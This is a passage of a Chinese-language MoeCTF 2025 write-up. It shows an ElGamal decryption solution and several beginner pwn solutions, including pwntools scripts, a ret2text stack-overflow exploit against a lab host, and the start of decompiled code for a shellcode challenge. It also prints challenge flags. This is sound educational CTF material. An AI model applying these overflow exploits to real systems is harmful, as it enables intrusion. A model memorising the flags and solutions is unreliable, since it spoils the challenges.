+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863</span>
+</span></span><span class="line"><span class="cl"><span class="n">c1</span> <span class="o">=</span> <span class="mi">6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863</span>
+</span></span><span class="line"><span class="cl"><span class="n">c2</span> <span class="o">=</span> <span class="mi">2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983</span>
+</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="mi">8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解密计算</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>  <span class="c1"># 计算共享秘密</span>
+</span></span><span class="line"><span class="cl"><span class="n">s_inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>  <span class="c1"># 计算s的模逆</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">c2</span> <span class="o">*</span> <span class="n">s_inv</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>  <span class="c1"># 计算明文</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 转换为字节并输出</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据提供的 ElGamal 加密参数和解密过程，直接计算即可得到 flag。以下是计算结果：</p>
+<p>通过执行解密步骤：</p>
+<ol>
+<li>计算共享秘密 <code>s = pow(c1, x, p)</code></li>
+<li>计算明文 <code>m = (c2 * pow(s, -1, p)) % p</code></li>
+<li>将 <code>m</code> 转换为字节流</li>
+</ol>
+<p>最终得到的 flag 为：</p>
+<p>moectf{th1s_1s_y0ur_f1rst_ElG@m@l}</p>
+<h2 id="二进制漏洞审计">二进制漏洞审计
+</h2><p><a class="link" href="pwn_tutorial.pdf" >pwn_tutorial.pdf</a></p>
+<h3 id="二进制漏洞审计入门指北">二进制漏洞审计入门指北
+</h3><hr>
+<p>这里是 MoeCTF 2025 Pwn。在真正开始 Pwn 之前，我们先来实操一下 Pwntools。</p>
+<p>第一个附件是 Pwn 入门指北，有较完整的 Pwn 入门学习路线和 Pwn 环境配置方法。</p>
+<p>第二个附件是本题程序，连接远程环境后就能与它交互。请在自己的电脑上配置好 Pwn 环境然后尝试运行下面的解题脚本获取 flag。（还需要一些修改）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>                                    <span class="c1"># 导入 pwntools。</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span> <span class="c1"># 一些基本的配置。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)             # 在本地运行程序。</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)                    # 启动 GDB</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="err">???</span><span class="p">,</span> <span class="err">???</span><span class="p">)</span>              <span class="c1"># 与在线环境交互。</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;114511&#39;</span><span class="p">)</span>              <span class="c1"># 什么时候用 send 什么时候用 sendline？</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>          <span class="c1"># p32(0xdeadbeef)、b&#34;\xde\xad\xbe\xef&#34;、b&#34;deadbeef&#34; 有什么区别？</span>
+</span></span><span class="line"><span class="cl">                                    <span class="c1"># 你看懂原程序这里的检查逻辑了吗？</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;shuijiangui&#39;</span>           <span class="c1"># strcmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;password.&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># 发送！通过所有的检查。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>                    <span class="c1"># 手动接收 flag。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>直接套这个exp就好，改下IP和端口号：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>                                    <span class="c1"># 导入 pwntools。</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span> <span class="c1"># 一些基本的配置。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)             # 在本地运行程序。</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)                    # 启动 GDB</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&#34;192.168.149.1&#34;</span><span class="p">,</span> <span class="mi">6280</span><span class="p">)</span>              <span class="c1"># 与在线环境交互。</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;114511&#39;</span><span class="p">)</span>              <span class="c1"># 什么时候用 send 什么时候用 sendline？</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>          <span class="c1"># p32(0xdeadbeef)、b&#34;\xde\xad\xbe\xef&#34;、b&#34;deadbeef&#34; 有什么区别？</span>
+</span></span><span class="line"><span class="cl">                                    <span class="c1"># 你看懂原程序这里的检查逻辑了吗？</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;shuijiangui&#39;</span>           <span class="c1"># strcmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;password.&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># 发送！通过所有的检查。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>                    <span class="c1"># 手动接收 flag。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类似这样的结果：</p>
+<p><img src="/p/moectf_2025/38.png"
+	width="885"
+	height="260"
+	srcset="/p/moectf_2025/38_hu_a9c0e644c81c1e88.png 480w, /p/moectf_2025/38_hu_f769b4c5d2e6e38d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="340"
+		data-flex-basis="816px"
+	
+></p>
+<p>flag是动态的请不要乱套我这个噢(*^_^*)</p>
+<h3 id="1-ez_u64">1 ez_u64
+</h3><hr>
+<p>字节流是一种常见的数据表示形式，用于存储、传输和处理各种类型的数据。我们不妨试试用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。</p>
+<blockquote>
+<p>和入门指北题一样，这也是一道 Pwntools 练习题。只是这次轮到你自己来写脚本了。</p>
+</blockquote>
+<hr>
+<p>IDA分析函数：</p>
+<p><img src="/p/moectf_2025/39.png"
+	width="930"
+	height="460"
+	srcset="/p/moectf_2025/39_hu_1ff55d77a5e35379.png 480w, /p/moectf_2025/39_hu_b54b8e88cb53049d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="485px"
+	
+></p>
+<p>write函数将num真实值打印出来，然后就需要接收，再通过scanf返回给程序，（v1==num）比较正确就能执行后门函数。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,</span><span class="mi">46404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;hint.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个payload = u64(io.recv(8).ljust(8, b&rsquo;\x00&rsquo;))，我加了ljust比较严谨一点，日后这是一个好习惯(*^_^*)!!!</p>
+<h3 id="1-find-it">1 find it
+</h3><hr>
+<p>fd(文件描述符)是什么？希望你能在本题中了解fd有什么用，又是如何分配的。</p>
+<hr>
+<p>初始fd：0，1，2分配给了stdin,stdout,stderr。新的stdout从3开始分配。open flag后，由于关闭了1，flag会被分配到1。依次输入3,./flag,1即可。</p>
+<p><img src="/p/moectf_2025/40.png"
+	width="770"
+	height="218"
+	srcset="/p/moectf_2025/40_hu_320dff6c0f1ab1fb.png 480w, /p/moectf_2025/40_hu_b03ecf299c31aec9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="353"
+		data-flex-basis="847px"
+	
+></p>
+<h3 id="2-eztext">2 EZtext
+</h3><hr>
+<p>劫持程序的执行流是我们在 Pwn 中经常要做的事情，首先你需要了解一下程序的调用栈的结构，然后理解为什么我们能通过栈上缓冲区溢出来劫持控制流。再次强推我们写的 Pwn 入门指北好吗！把指北都读一遍，你会了解不少东西以及在这道题要踩的一个经典的坑。</p>
+<blockquote>
+<p>ROP 是 Pwn 中使用频率非常高的一个利用手段，而本题 ret2text 正是典型的 ROP，看一看 CTFWiki 和入门指北（入门指北中有 ret2text 实例），然后开启你的 ROP 挑战吧！</p>
+</blockquote>
+<hr>
+<p>checksec看一下：</p>
+<p><img src="/p/moectf_2025/41.png"
+	width="570"
+	height="210"
+	srcset="/p/moectf_2025/41_hu_8b1c44e7de24ea44.png 480w, /p/moectf_2025/41_hu_981e2bb5ac901e30.png 1024w"
+	loading="lazy"
+	
+		alt="checksec查看保护信息"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+></p>
+<p>居然没开canary保护，可以用栈溢出进行ret2text。</p>
+<p>找到了一个后门函数：</p>
+<p><img src="/p/moectf_2025/42.png"
+	width="725"
+	height="150"
+	srcset="/p/moectf_2025/42_hu_e4a94f87e9b0d3d8.png 480w, /p/moectf_2025/42_hu_be0daeb91b94e841.png 1024w"
+	loading="lazy"
+	
+		alt="地址：0x4011B6"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="483"
+		data-flex-basis="1160px"
+	
+></p>
+<p>查看main函数：</p>
+<p><img src="/p/moectf_2025/43.png"
+	width="840"
+	height="278"
+	srcset="/p/moectf_2025/43_hu_d2fb7ce33094a6ea.png 480w, /p/moectf_2025/43_hu_a6e41e8eb3224052.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>scanf等你输入一个数，这个数存进v4内，然后带进overflow内当参数，并且这个数还是作为限制你后面注入payload的长度的值。</p>
+<p>跟进overflow函数：</p>
+<p><img src="/p/moectf_2025/44.png"
+	width="781"
+	height="186"
+	srcset="/p/moectf_2025/44_hu_289fe97483a47c9a.png 480w, /p/moectf_2025/44_hu_d2cc51799e673816.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1007px"
+	
+></p>
+<p>我们需要让a1大于7从才能执行read函数，读取我们的payload，并且长度要够，那我们设定40吧，scanf要我们输入的时候就注入40吧。</p>
+<p>这个buf的地址在rbp之下的0x8的位置，也就是说缓冲区是0x8，再加上覆盖rbp本身所需的8字节大小，总共就是要0x16大小。</p>
+<p><img src="/p/moectf_2025/45.png"
+	width="980"
+	height="275"
+	srcset="/p/moectf_2025/45_hu_6d1ba75bff89326e.png 480w, /p/moectf_2025/45_hu_3ab0e3967b0327d8.png 1024w"
+	loading="lazy"
+	
+		alt="ret:0x000000000040101a"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="356"
+		data-flex-basis="855px"
+	
+></p>
+<p>这是64位程序完事后，记得栈平衡啊。</p>
+<p>exp（python3）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;192.168.149.1&#39;</span><span class="p">,</span><span class="mi">25708</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;40&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011B6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-ezshellcode">2 ezshellcode
+</h3><hr>
+<p>由于直接向程序注入任意机器码（shellcode）比ROP这样的代码重用攻击灵活得多，我们时常只通过ROP构造注入shellcode的机会，然后劫持控制流执行shellcode。那么为了执行它我们需要怎么做呢？在这个题里你将得到答案。</p>
+<blockquote>
+<p>注意一下pwntools的context设置，因为最后你大概会通过pwntools的asm函数来汇编shellcode，此时asm会根据context中arch字段决定shellcode的架构。另外，pwntools中还给了我们一个shellcode神器——shellcraft，请去了解下怎么使用。</p>
+</blockquote>
+<hr>
+<p>checksec看到程序是64位保护全开的。</p>
+<p>IDA64位分析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">prot</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">s</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1LL</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">prot</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;In a ret2text exploit, we can use code in the .text segment.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;But now, there is no &#39;system&#39; function available there.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;How can you get the flag now? Perhaps you should use shellcode.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;But what is shellcode? What can you do with it? And how can you use it?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I will give you some choices. Choose wisely!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v7</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You can only make one change!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prot</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LABEL_24</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You can only make one change!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prot</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
